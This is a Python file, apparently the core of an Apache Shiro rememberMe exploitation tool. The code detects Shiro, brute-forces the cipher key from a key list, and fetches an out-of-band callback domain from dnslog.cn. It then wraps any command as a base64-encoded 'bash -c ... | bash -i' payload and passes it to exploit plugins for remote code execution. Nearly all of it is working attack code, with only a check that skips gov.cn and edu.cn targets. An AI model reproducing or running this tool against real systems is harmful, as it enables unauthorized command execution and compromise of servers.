#!/usr/bin/env python
# _*_ coding:utf-8 _*_
import requests,re
requests.packages.urllib3.disable_warnings()

def scripts(url,command):
    processor = Idea()
    if "gov.cn" in url or "edu.cn" in url:
        print("[-  存在敏感域名，停止检测，请使用其他工具或自行手工检测,抱歉")
        return False
    print("[*] 开始检测目标是否存在Shiro   Target: {}".format(url))
    if processor.checkExistShiro(url):
        import time
        print("[+] 目标存在Shiro组件")
        print("[*] 开始遍历目标使用Key值,请稍等...")
        resKey = processor.findTargetKey(url)

        if resKey:
            print("[+] 目标使用key值: {}".format(resKey))
            print("[*] 开始请求Dnslog获得验证域名,请稍等...")
            func = processor.getDnslogCookie()
            if '内网环境' in func:
                print('[+] 检测到疑似内网环境，关闭dnslog功能和URLDNS，JRMP检测  执行命令: {} \n'.format(command))
            else:
                dnslog = func[0]
                print('[+] 获得验证Dnslog: {}  执行命令: {} \n'.format(dnslog,command))
            time.sleep(1)
            try:
                baseCommand = processor.getBase64Command(command)
                processor.process(url,baseCommand,resKey,func)
            except Exception as e:
                print(e)
        else:
            print("[-] 很遗憾没有找到目标使用的key")

        
    else:
        print("[-] 目标不存在Shiro组件，请确定输入Url是否正确")
        return True




class Idea(object):
    PLUGINS = {}

    def process(self,url,command,resKey,func,):

        for plugin_name in self.PLUGINS.keys():
            try:
                print("[*]  开始检测模块",plugin_name)
                self.PLUGINS[plugin_name]().process(url,command,resKey,func)
                
            except Exception as e:
                print(e)
                print ("[-]{} 检测失败，请检查网络连接或目标是否存活".format(plugin_name))

        print("[+] 检测完毕!")
        return

    def checkRe(self,target):

        pattern = re.compile(u'^re(.*?)Me') 
        result  = pattern.search(target)
        if result:
            return True
        else:
            return False

    def checkExistShiro(self,url):
        
        isExist = False

        header={
            'User-agent' : 'Mozilla/5.0 (Windows NT 6.2; WOW64; rv:22.0) Gecko/20100101 Firefox/22.0;',
            'Cookie' : 'rememberMe=1'
            }

        check_one="rememberMe"
        check_two="deleteMe"

        try:
            res = requests.post(url,allow_redirects=False,headers=header,verify=False,timeout=30)
            resHeader = str(res.headers)
            check = self.checkRe(resHeader)

            if check_one in resHeader  or check_two in resHeader or check:
                isExist = True

            return isExist
        except Exception as e:
            print(e)
            return isExist


    def findTargetKey(self,url):
        with open('moule/key.log','r') as k:
            ke = k.readlines()
            for i in ke:
                x   = i.strip('\n')
                y   = x.split(':')
                key = y[0]
                keyCookie = y[1]
                header={
                    'User-agent' : 'Mozilla/5.0 (Windows NT 6.2; WOW64; rv:22.0) Gecko/20100101 Firefox/22.0;',
                    'Cookie' : 'rememberMe={}'.format(keyCookie)
                    }
                res = requests.post(url,headers=header,allow_redirects=False,verify=False,timeout=30)
                if 'rememberMe' not in str(res.headers):
                    return key
                else:
                    continue
                return False

    def getDnslogCookie(self):
        dnslog    = "http://dnslog.cn/getdomain.php"
        try:
            res   = requests.get(dnslog,timeout=10)
        except:
            return '内网环境'
        dnslogUrl = res.text
        cookie    = res.cookies
        phpsessid = cookie['PHPSESSID']
        return  dnslogUrl, phpsessid

    def getBase64Command(self,command):
        import  base64
        base1 = str(base64.b64encode(str(command).encode(encoding='utf-8')))
        base2 = base1.replace("b'","")
        base3 = base2.replace("'","")
        payload = "bash -c {echo,"+str(base3)+'}|{base64,-d}|{bash,-i}'
        return payload

    @classmethod
    def plugin_register(cls, plugin_name):
        def wrapper(plugin):
            cls.PLUGINS.update({plugin_name:plugin})
            return plugin
        return wrapper

# def findKey():
    